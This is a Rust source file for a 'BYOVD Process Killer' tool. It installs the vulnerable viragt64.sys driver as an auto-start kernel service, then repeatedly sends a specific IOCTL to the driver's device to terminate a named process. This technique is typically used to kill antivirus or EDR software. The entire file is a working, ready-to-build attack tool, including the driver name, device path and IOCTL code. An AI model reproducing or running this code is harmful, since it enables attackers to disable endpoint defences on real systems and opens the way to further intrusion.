#![allow(non_snake_case,non_camel_case_types, dead_code)]

extern crate winapi;


use clap::{App, Arg};
use ctrlc;

use std::ffi::{CString, OsStr};
use std::marker::PhantomData;
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::ptr::{null};
use std::sync::{Arc, atomic::{AtomicBool, Ordering}};
use std::thread::sleep;
use std::time::Duration;
use winapi::shared::{
    minwindef::{DWORD, LPVOID},
    ntdef::NULL,
    winerror::NO_ERROR,
};
use winapi::um::{
    fileapi::{CreateFileW, OPEN_EXISTING},
    handleapi::{CloseHandle, INVALID_HANDLE_VALUE},
    ioapiset::DeviceIoControl,
    processenv::GetCurrentDirectoryW,
    winnt::{SERVICE_AUTO_START, HANDLE, SERVICE_ERROR_NORMAL, SERVICE_KERNEL_DRIVER, SERVICE_WIN32_OWN_PROCESS},
    winsvc::{CloseServiceHandle, ControlService, SERVICE_STOPPED, CreateServiceW, DeleteService, OpenSCManagerA, OpenSCManagerW, OpenServiceA, OpenServiceW, 
            SC_HANDLE, SC_MANAGER_CREATE_SERVICE, SERVICE_ALL_ACCESS, SERVICE_CONTROL_STOP, SERVICE_STATUS, StartServiceA},
};
use std::os::raw::c_char;

const MAX_PATH: usize = 260;

struct BYOVD_TEMPLATE;


trait Driver {
    type IoctlStruct;

    fn driver_name() -> &'static str;
    fn driver_path() -> &'static str;
    fn device_name() -> &'static str;
    fn ioctl_code() -> DWORD;
    fn create_ioctl_struct(process_name: &str) -> Self::IoctlStruct; 
}


#[repr(C, packed)]
struct BYOVD_TEMPLATEIoctlStruct {
    process_name: [c_char; 256], 
}

impl BYOVD_TEMPLATEIoctlStruct {
    fn new(process_name: &str) -> Self {
        let mut name_buffer = [0 as c_char; 256]; 

        
        let truncated_name = if process_name.len() >= 255 {
            &process_name[..255]
        } else {
            process_name
        };

        
        for (i, &byte) in truncated_name.as_bytes().iter().enumerate() {
            name_buffer[i] = byte as c_char;
        }

        
        
        name_buffer[255] = 0 as c_char;

        Self {
            process_name: name_buffer,
        }
    }
}


impl Driver for BYOVD_TEMPLATE {
    type IoctlStruct = BYOVD_TEMPLATEIoctlStruct;

    fn driver_name() -> &'static str {
        "viragt64"
    }

    fn driver_path() -> &'static str {
        "\\viragt64.sys"
    }

    fn device_name() -> &'static str {
        "\\\\.\\viragtlt"  
    }

    fn ioctl_code() -> DWORD {
        0x82730030  
    }

    fn create_ioctl_struct(process_name: &str) -> Self::IoctlStruct {
        BYOVD_TEMPLATEIoctlStruct::new(process_name)
    }
}


struct BYOVD<D: Driver> {
    h_sc: SC_HANDLE,
    h_service: SC_HANDLE,
    _marker: PhantomData<D>,
}

impl<D: Driver> BYOVD<D> {
    fn new() -> Option<Self> {
        let h_sc = unsafe { OpenSCManagerW(std::ptr::null(), std::ptr::null(), SC_MANAGER_CREATE_SERVICE) };
        if h_sc.is_null() {
            return None;
        }
        
        let h_service = unsafe {
            OpenServiceW(
                h_sc,
                to_wstring(D::driver_name()).as_ptr(),
                SERVICE_ALL_ACCESS,
            )
        };

        if h_service.is_null() {
            let current_dir = get_current_dir();
            let file_path = format!("{}{}", current_dir, D::driver_path());
            let wide_file_path = to_wstring(&file_path);
            let wide_file_path_ptr = wide_file_path.as_ptr();

            let h_service = unsafe {
                CreateServiceW(
                    h_sc,
                    to_wstring(D::driver_name()).as_ptr(),
                    to_wstring(D::driver_name()).as_ptr(),
                    SERVICE_ALL_ACCESS,
                    SERVICE_KERNEL_DRIVER,
                    SERVICE_AUTO_START, 
                    SERVICE_ERROR_NORMAL,
                    wide_file_path_ptr,
                    std::ptr::null(),
                    std::ptr::null_mut(),
                    std::ptr::null(),
                    std::ptr::null(),
                    std::ptr::null(),
                )
            };

            if h_service.is_null() {
                println!("[!] Failed to create service.");
                unsafe { CloseServiceHandle(h_sc); }
                return None;
            }
        } else {
            println!("[!] Service already exists.");
            unsafe { CloseServiceHandle(h_sc); }
            return Some(Self {
                h_sc,
                h_service,
                _marker: PhantomData,
            });
        }

        Some(Self {
            h_sc,
            h_service,
            _marker: PhantomData,
        })
    }


    fn start_driver(&mut self) -> bool {
        let h_sc = unsafe {
            OpenSCManagerA(
                null(),
                null(),
                SC_MANAGER_CREATE_SERVICE,
            )
        };

        if h_sc.is_null() {
            return false;
        }

        let h_service = unsafe {
            OpenServiceA(
                h_sc,
                to_string(D::driver_name()).as_ptr(),
                SERVICE_ALL_ACCESS,
            )
        };

        if h_service.is_null() {
            unsafe {
                CloseServiceHandle(h_sc);
            }
            unsafe {
                CloseServiceHandle(self.h_service);
            }
            return false;
        }

        let is_started = unsafe {
            StartServiceA(
                h_service,
                0,
                null::<*const i8>() as *mut *const i8,
            )
        };

        if is_started == 0 {
            unsafe {
                CloseServiceHandle(h_sc);
            }
            unsafe {
                CloseServiceHandle(h_service);
            }
            return false;
        }

        unsafe {
            CloseServiceHandle(h_sc);
        }
        unsafe {
            CloseServiceHandle(h_service);
        }

        true
    }


    fn stop_driver(&mut self) -> bool {
        let h_sc = unsafe {
            OpenSCManagerA(
                std::ptr::null(),
                std::ptr::null(),
                SC_MANAGER_CREATE_SERVICE,
            )
        };

        if h_sc.is_null() {
            return false;
        }

        let h_service = unsafe {
            OpenServiceA(
                h_sc,
                to_string(D::driver_name()).as_ptr(),
                SERVICE_ALL_ACCESS,
            )
        };

        if h_service.is_null() {
            unsafe {
                CloseServiceHandle(h_sc);
            }
            return false;
        }

        let mut service_status = SERVICE_STATUS {
            dwServiceType: SERVICE_WIN32_OWN_PROCESS, 
            dwCurrentState: SERVICE_STOPPED,         
            dwControlsAccepted: 0,                   
            dwWin32ExitCode: NO_ERROR,               
            dwServiceSpecificExitCode: 0,            
            dwCheckPoint: 0,                         
            dwWaitHint: 0,                           
        };

        let control_result = unsafe {
            ControlService(
                h_service,
                SERVICE_CONTROL_STOP,
                &mut service_status,
            )
        };

        if control_result == 0 {
            println!("[X] Failed to immediately stop the service.");
        }

        
        let delete_result = unsafe {
            DeleteService(h_service)
        };

        if delete_result == 0 {
            println!("[X] Failed to delete the service.");
        } else {
            println!("[!] Service marked for deletion.");
        }

        
        unsafe {
            CloseServiceHandle(h_service);
            CloseServiceHandle(h_sc);
        }

        true
    }


    fn kill_process_by_name(&self, process_name: &str) {
        let mut driver_ioctl = D::create_ioctl_struct(process_name);

        let h_driver: HANDLE = unsafe {
            CreateFileW(
                to_wstring(D::device_name()).as_ptr(),
                SERVICE_ALL_ACCESS,
                0,
                NULL as *mut _,
                OPEN_EXISTING,
                0,
                NULL as *mut _,
            )
        };

        if h_driver == INVALID_HANDLE_VALUE {
            println!("[X] Failed to open driver file.");
            return;
        }

        let mut output_buffer: DWORD = 0; 
        let mut bytes_returned: DWORD = 0; 

        let ioctl_result = unsafe {
            DeviceIoControl(
                h_driver as HANDLE, 
                D::ioctl_code(), 
                &mut driver_ioctl as *mut _ as LPVOID, 
                mem::size_of::<D::IoctlStruct>() as DWORD, 
                &mut output_buffer as *mut _ as LPVOID, 
                mem::size_of::<DWORD>() as DWORD, 
                &mut bytes_returned, 
                std::ptr::null_mut(), 
            )
        };

        if ioctl_result == 0 {
            println!("[X] Failed to send IOCTL.");
        }

        unsafe {
            CloseHandle(h_driver);
        }
    }
}


fn to_wstring(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(Some(0))
        .collect()
}


fn to_string(s: &str) -> CString {
    CString::new(s).unwrap()
}


fn get_current_dir() -> String {
    let mut buf: Vec<u16> = vec![0; MAX_PATH];
    unsafe {
        GetCurrentDirectoryW(MAX_PATH as u32, buf.as_mut_ptr());
    }
    
    let len = buf.iter().position(|&c| c == 0).unwrap_or_else(|| buf.len());
    buf.truncate(len);
    String::from_utf16_lossy(&buf)
}


fn main() {
    let matches = App::new("BYOVD Process Killer")
        .version("1.0")
        .author("BlackSnufkin")
        .about("Kills a process by name using viragt64 driver")
        .arg(Arg::new("process_name").short("n").long("name").takes_value(true))
        .get_matches();

    let process_name = match matches.value_of("process_name") {
        Some(name) => name,
        None => {
            eprintln!("[X] No process name provided");
            return; 
        },
    };

    let byovd_drv = BYOVD::<BYOVD_TEMPLATE>::new();
    if let Some(mut drv) = byovd_drv {
        println!("[!] Driver is initialized !");

        if drv.start_driver() {
            println!("[!] Driver started !");
        }

        let continue_loop = Arc::new(AtomicBool::new(true));
        let continue_loop_clone = continue_loop.clone();

        ctrlc::set_handler(move || {
            continue_loop_clone.store(false, Ordering::SeqCst);
        }).expect("Error setting Ctrl+C handler");

        println!("[!] Killing process: {}", process_name);
        println!("[!] Press Ctrl+C to stop the program.");
        loop {

            
            sleep(Duration::from_millis(700));
            if !continue_loop.load(Ordering::SeqCst) {
                break;
            }

            drv.kill_process_by_name(process_name);

        }
        
        
        /*
        This is disabled BSOD will happned if the driver will be unloaded so wired bug in the driver
        
        if drv.stop_driver() {
            println!("[!] Driver stopped !");
        }
        */

    } else {
        println!("[X] Failed to initialize the driver.");
    }
}
